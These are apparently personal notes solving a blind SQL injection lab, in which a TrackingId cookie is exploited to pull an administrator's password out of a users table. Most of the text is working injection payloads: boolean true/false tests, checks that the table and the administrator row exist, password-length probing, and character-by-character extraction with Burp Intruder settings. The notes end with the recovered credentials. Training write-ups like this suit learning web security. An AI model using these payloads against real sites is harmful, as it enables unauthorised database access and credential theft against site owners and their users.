    tracking cookie vulnerable to Blind SLQi: 
    the scenario told me DB have users table and username & password column
    use SQLi technique to achieve administator's password
    
    
    
    # test Boolean base SQLi: 
    
    Cooike: TrackingId=...xyz' AND '1'='1;     => wellcome back! in HTTP response 
    Cooike: TrackingId=...xyz' AND '1'='2;     => don't show Wellcome back! in HTTP response 
    
    
    
    # verify the DB have users table: 
    
    xyz' AND (SELECT 'a' FROM users limit 1)='a;
    
    
    
    # verify the users table have administrator username:
    
    xyz' AND (SELECT 'a' FROM users where username='administrator') = 'a;
    
    
    
    
    # Length of administrator's password:
    
    xyz' AND ( SELECT 'a' FROM users WHERE username='administrator' and LENGTH(password) > 1 ) = 'a;
    
    send it to burp intruder : 
    
    AND ( SELECT 'a' FROM users WHERE username='administrator' and LENGTH(password) > $1$ ) = 'a
    Payload = [0-9] 
    length = [1-25]
    
    and the length of password => 20
    
    
    
    # brute force password character: 
    
    
    AND SUBSTR( ( SELECT password FROM users where username='administrator' ) , 1 , 1 ) = 'a;
    
    
    PAYLOAD = [a-z][0-9]
    length = [1-20]
    
    
    password = ekv7b0giryfr9sk91d3f
    
    
    administrator:ekv7b0giryfr9sk91d3f
